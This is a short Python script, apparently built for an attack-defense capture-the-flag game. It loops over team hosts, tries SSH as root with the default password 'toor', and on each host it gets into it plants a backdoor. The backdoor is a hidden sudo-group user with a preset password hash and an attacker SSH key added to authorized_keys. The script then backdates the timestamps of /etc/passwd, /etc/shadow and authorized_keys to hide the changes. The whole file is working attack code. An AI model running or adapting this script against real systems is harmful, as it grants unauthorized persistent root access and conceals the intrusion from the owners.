#!/usr/bin/env python3

import json
import paramiko

def backdoor(client):
	payload1 = "useradd systemd-maintenance -r -M -N -g sudo -p '$y$j9T$.10IKhcz7yTEU8kgQqwJ51$raqoxQN1.XqstCFDrqci/XZzTYszuM3fdxQZEBHfgU7'"
	ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnFGhBjvzM0Al142glQfd++oBaxzsUUMU9AtWA2nh069/gqT5PINA4IzoxRzQ8rAuWxL9DS6LKGX6BtejqyqdzBhrnEGs/r/fYR3NBy1xcKI/GPJj4YrKEA3vueK6GKsA5nvo1C07oEOLUr5FUkaYvlzFf32ziPEih2zbS4Qyi3Xh2FPYj6czZl7Voo/T1rwaGgA7UzNnvLhQkE1IOXHiDz6QU+sSLuUPRUY4FHOufZ7BUgQD7byTuQ5DfWaFj/9TBTlOjl3a9FySkfo6cegJ27YaJY47mnQk5eQujb99lapGDQP6b2V8nWOLvC34Zimi4cHJd7XR2LJ2yuXodyfRCH7mTapbEuxbrnPAIwNXXZTCRlvwTnQY1UcoazQDJ52K05HPTF/HHt7HSp4GtTsQ90GWE5/z+dKe38fPuWMXuVCEnHXWy+wJsx+qtd3s7HfBzq7FSuUCsaHOuWCsX2qBoN5MsSgAKZm9Rk7dY6/N9RC8jYjK9kfCVQUPFb5t+KCE= ctfbot_recovery@gameserver"
	payload2 = "echo -n '" + ssh_key + "' >> ~/.ssh/authorized_keys"
	print("Injecting backdoor...")
	client.exec_command(payload1)
	client.exec_command(payload2)
	hide="touch -t 202001010000 /etc/passwd ; touch -t 202001010000 /etc/shadow ; touch -t 202001010000 ~/.ssh/authorized_keys"
	client.exec_command(hide)
	print("Injection successful!")

teams = json.load(open("teams.json", "r"))
for team in teams.keys():
	if team == "uniba":
		continue
	print("Now trying " + team)
	client = paramiko.client.SSHClient()
	client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
	try:
		client.connect(teams[team], username="root", password="toor")
	except:
		print("Failed.")
		continue
	print("^^^^^ Successful!!! ^^^^^^")
	backdoor(client)
